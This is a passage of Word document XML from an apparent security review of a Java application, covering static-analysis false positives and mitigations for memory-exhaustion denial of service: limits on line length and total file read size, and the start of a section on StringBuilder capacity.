      <w:bookmarkEnd w:id="117"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00476FB3">
        <w:t>False positive Expression is Always true for “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00476FB3">
        <w:t>deepCopy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00476FB3">
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B061896" w14:textId="2C9B2B2F" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6815C9EF" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="001A39A9" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="4BFD36CD" wp14:editId="07777777">
            <wp:extent cx="3839517" cy="669683"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="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3"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3839517" cy="669683"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F0C013" w14:textId="4D12354B" w:rsidR="00344C2C" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="118" w:name="_Ref199859563"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>25</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="118"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00F86EBD">
        <w:t>False positive Expression is Always true for “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00F86EBD">
        <w:t>cacheName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="00F86EBD">
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13038B44" w14:textId="3B603B72" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4538602E" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="001A39A9" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="748281C4" wp14:editId="07777777">
            <wp:extent cx="3386138" cy="1535574"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="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4"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3386138" cy="1535574"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7444BF" w14:textId="4EB5FFCD" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="119" w:name="_Ref199859599"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="119"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:t>False positive Expression is Always true for “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:t>cacheName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A21919" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15E8DA2F" w14:textId="059D96A3" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="120" w:name="_Toc200039312"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Denial of Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="120"/>
    </w:p>
    <w:p w14:paraId="75E819D5" w14:textId="497281F7" w:rsidR="00FE2E9A" w:rsidRPr="00FE2E9A" w:rsidRDefault="00FE2E9A" w:rsidP="00FE2E9A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Two areas of concern regarding text file manipulation were identified in the project: one in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>readTextFromFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> method of FileUtilities.java and the other in the file reading methods of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>RestImportService.java</w:t>
      </w:r>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">  (</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199950949 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="005025F4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>. In both cases, the original code performed line-by-line reading of the file without enforcing any limits on line length or the size of the read material.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389456A2" w14:textId="0B4F2927" w:rsidR="00FE2E9A" w:rsidRPr="00FE2E9A" w:rsidRDefault="00FE2E9A" w:rsidP="00FE2E9A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This lack of control exposed the application to potential stability issues. In particular, when reading in a large file or one containing an extremely long line with no line breaks, the system might attempt to read the entire contents into memory without filtering. This posed a serious threat of RAM saturation and subsequent shutdown of the service.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="158D1023" w14:textId="3047B25A" w:rsidR="00FE2E9A" w:rsidRPr="00FE2E9A" w:rsidRDefault="00FE2E9A" w:rsidP="00FE2E9A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>To address this critical issue and improve system robustness, two protection mechanisms were introduced:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEDE2C1" w14:textId="1A86CCFC" w:rsidR="00FE2E9A" w:rsidRPr="00776E8E" w:rsidRDefault="00FE2E9A" w:rsidP="00776E8E">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00776E8E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">A limit on line length was introduced, setting a </w:t>
      </w:r>
      <w:r w:rsidRPr="004C1FD9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>maximum of 4096 characters</w:t>
      </w:r>
      <w:r w:rsidRPr="00776E8E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> for every line read. If a line exceeds this limit, reading is halted immediately and an error is generated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692591DB" w14:textId="7D41E618" w:rsidR="00FE2E9A" w:rsidRPr="00776E8E" w:rsidRDefault="00FE2E9A" w:rsidP="00776E8E">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00776E8E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Total content read size limit: </w:t>
      </w:r>
      <w:r w:rsidRPr="004C1FD9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>a maximum limit of 10 MB</w:t>
      </w:r>
      <w:r w:rsidRPr="00776E8E">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the total size of data readable from a file was fixed. Again, if this limit is exceeded, the operation is aborted with an error message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF9D7B3" w14:textId="48F0BA6C" w:rsidR="00FE2E9A" w:rsidRPr="00FE2E9A" w:rsidRDefault="00FE2E9A" w:rsidP="00FE2E9A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">These checks have been incorporated into the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>readTextFromFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> method in </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>FileUtilities.java</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>getResourceFiles</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>readFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> methods in </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>RestImportService.java</w:t>
      </w:r>
      <w:r w:rsidR="00A13121">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="0045258B">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="0045258B">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199951164 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="0045258B">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="0045258B">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="0045258B">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00A13121">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D4B61C" w14:textId="77777777" w:rsidR="00FE2E9A" w:rsidRPr="00FE2E9A" w:rsidRDefault="00FE2E9A" w:rsidP="00FE2E9A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE2E9A">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>These changes enable the system to recognise potentially critical conditions early on and prevent the reading of excessively large or corrupted files, thus avoiding memory flooding and ensuring service continuity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D780C75" w14:textId="77777777" w:rsidR="00FE2E9A" w:rsidRPr="00FE2E9A" w:rsidRDefault="00FE2E9A" w:rsidP="00FE2E9A">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B15BDE4" w14:textId="77777777" w:rsidR="00F839C0" w:rsidRDefault="6498005D" w:rsidP="0B9DF8C6">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2EFFDE60" wp14:editId="1E86A1D1">
            <wp:extent cx="3646752" cy="1268172"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1774670040" name="Immagine 1774670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3646752" cy="1268172"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1958F9F7" w14:textId="057A2CCF" w:rsidR="00F839C0" w:rsidRDefault="663E56B0" w:rsidP="0B9DF8C6">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FBB14FE" wp14:editId="5F75D401">
            <wp:extent cx="3657334" cy="1752600"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="94064976" name="Immagine 94064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3657334" cy="1752600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F865D2" w14:textId="77777777" w:rsidR="00F839C0" w:rsidRDefault="5C8ABD5F" w:rsidP="00F839C0">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7320E36C" wp14:editId="39AFCCDB">
            <wp:extent cx="3652908" cy="2838450"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="756369397" name="Immagine 756369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3652908" cy="2838450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD18F9B" w14:textId="79725DEB" w:rsidR="00910649" w:rsidRDefault="00F839C0" w:rsidP="00F839C0">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="121" w:name="_Ref199950949"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>27</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="121"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="0044015C">
        <w:t>Denial of Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C4798D" w14:textId="77777777" w:rsidR="00805DC0" w:rsidRDefault="00805DC0" w:rsidP="00805DC0">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4436960B" w14:textId="10F8E143" w:rsidR="00805DC0" w:rsidRDefault="00805DC0" w:rsidP="00396772">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00805DC0">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="36E68ADA" wp14:editId="54BE2010">
            <wp:extent cx="3710940" cy="2140912"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="200761012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610126" name="Picture 1" descr="A screen shot of a computer program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId38"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3737778" cy="2156395"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C20A115" w14:textId="60918AA9" w:rsidR="00187713" w:rsidRDefault="00187713" w:rsidP="00396772">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00187713">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A8151B5" wp14:editId="4058573E">
            <wp:extent cx="3489960" cy="2302160"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="1847882717"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882717" name="Picture 1" descr="A screen shot of a computer program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId39"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3494501" cy="2305155"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BF69D4" w14:textId="77777777" w:rsidR="00396772" w:rsidRDefault="00396772" w:rsidP="00396772">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00396772">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60BC8EDE" wp14:editId="0E84DADE">
            <wp:extent cx="3520440" cy="3265833"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="33315069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150694" name="Picture 1" descr="A screen shot of a computer program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId40"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3527118" cy="3272028"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB17AAF" w14:textId="4B49C448" w:rsidR="00396772" w:rsidRDefault="00396772" w:rsidP="00396772">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="122" w:name="_Ref199951164"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>28</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="122"/>
      <w:r>
        <w:t xml:space="preserve">: Mitigate </w:t>
      </w:r>
      <w:r w:rsidRPr="003527C4">
        <w:t>Denial of Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F2934A" w14:textId="77777777" w:rsidR="00396772" w:rsidRPr="00805DC0" w:rsidRDefault="00396772" w:rsidP="00396772">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44F40533" w14:textId="08BD5655" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="123" w:name="_Toc200039313"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Denial of Service: StringBuilder</w:t>
      </w:r>
      <w:bookmarkEnd w:id="123"/>
    </w:p>
    <w:p w14:paraId="51EDAFD9" w14:textId="26A69824" w:rsidR="00292E5C" w:rsidRPr="00292E5C" w:rsidRDefault="00292E5C" w:rsidP="00292E5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292E5C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">The problem arises when objects such as StringBuilder are instantiated with the default capacity of 16 characters. This can become critical if the input is quite large: each time the content size exceeds the current capacity, the JVM will reallocate memory internally, resulting in progressive resource usage. If this mechanism is not </w:t>
      </w:r>
      <w:r w:rsidRPr="00292E5C">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>managed properly, it can be exploited to generate abnormal memory consumption and, in the worst cases, lead to a denial-of-service crash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267FFE56" w14:textId="163FDDC9" w:rsidR="00292E5C" w:rsidRPr="00292E5C" w:rsidRDefault="007808E7" w:rsidP="00292E5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007808E7">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>To mitigate this risk, targeted and structured mitigations have been introduced in the code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
